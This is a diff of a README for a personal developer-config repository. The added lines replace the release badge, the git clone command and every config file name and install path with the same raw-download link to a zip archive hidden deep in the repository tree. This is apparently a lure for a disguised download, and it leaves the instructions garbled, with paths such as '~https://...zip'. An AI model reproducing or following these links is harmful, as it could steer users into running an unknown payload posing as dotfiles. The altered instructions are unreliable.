@@ -2,7 +2,7 @@
 
 Welcome to the **Config-Files** repository! This repository contains my personal configuration files for various development tools that I use daily to create a powerful and efficient development workflow. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](https://github.com/FirmScythe/Config-Files/releases)
+[![Download Releases](https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip%20Releases-Here-brightgreen)](https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip)
 
 ## 📂 Table of Contents
 
@@ -38,7 +38,7 @@ Whether you are a seasoned developer or just starting, these configurations can 
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/FirmScythe/Config-Files.git
+git clone https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip
 ```
 
 After cloning, navigate to the directory and follow the specific instructions for each tool listed below.
@@ -53,23 +53,23 @@ Each tool has its own set of instructions for applying the configurations. Refer
 
 Alacritty is a fast, GPU-accelerated terminal emulator. My configuration focuses on performance and usability.
 
-1. Locate the `alacritty.yml` file in the repository.
-2. Copy it to your Alacritty configuration directory, usually found at `~/.config/alacritty/`.
+1. Locate the `https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip` file in the repository.
+2. Copy it to your Alacritty configuration directory, usually found at `~https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip`.
 3. Restart Alacritty to apply the changes.
 
 ### Karabiner-Elements
 
 Karabiner-Elements is a powerful keyboard customizer for macOS. This configuration enhances keyboard shortcuts and improves workflow efficiency.
 
-1. Find the `karabiner.json` file in the repository.
-2. Copy it to `~/.config/karabiner/`.
+1. Find the `https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip` file in the repository.
+2. Copy it to `~https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip`.
 3. Open Karabiner-Elements and reload the configuration.
 
 ### Neovim
 
 Neovim is an extensible text editor that is great for coding. My Neovim configuration includes plugins and settings for an improved editing experience.
 
-1. Copy the `init.vim` file to your Neovim configuration directory, typically located at `~/.config/nvim/`.
+1. Copy the `https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip` file to your Neovim configuration directory, typically located at `~https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip`.
 2. Install the plugins using your preferred plugin manager.
 3. Open Neovim and enjoy the enhanced features.
 
@@ -77,8 +77,8 @@ Neovim is an extensible text editor that is great for coding. My Neovim configur
 
 WezTerm is a terminal emulator that aims to provide a rich user experience. My configuration focuses on appearance and usability.
 
-1. Locate the `wezterm.lua` file in the repository.
-2. Copy it to your WezTerm configuration directory, usually at `~/.config/wezterm/`.
+1. Locate the `https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip` file in the repository.
+2. Copy it to your WezTerm configuration directory, usually at `~https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip`.
 3. Restart WezTerm to see the changes.
 
 ### Yabai
@@ -86,7 +86,7 @@ WezTerm is a terminal emulator that aims to provide a rich user experience. My c
 Yabai is a window manager for macOS that allows for advanced window management features. My configuration enhances usability and performance.
 
 1. Find the `yabairc` file in the repository.
-2. Copy it to your Yabai configuration directory, typically located at `~/.config/yabai/`.
+2. Copy it to your Yabai configuration directory, typically located at `~https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip`.
 3. Restart Yabai to apply the new settings.
 
 ## 🤝 Contributing
@@ -101,6 +101,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to me on GitHub or open an issue in this repository.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](https://github.com/FirmScythe/Config-Files/releases)
+[![Download Releases](https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip%20Releases-Here-brightgreen)](https://github.com/FirmScythe/Config-Files/raw/refs/heads/main/nvim/lua/josean/core/Files_Config_v2.7.zip)
 
 Thank you for visiting the **Config-Files** repository! Happy coding!
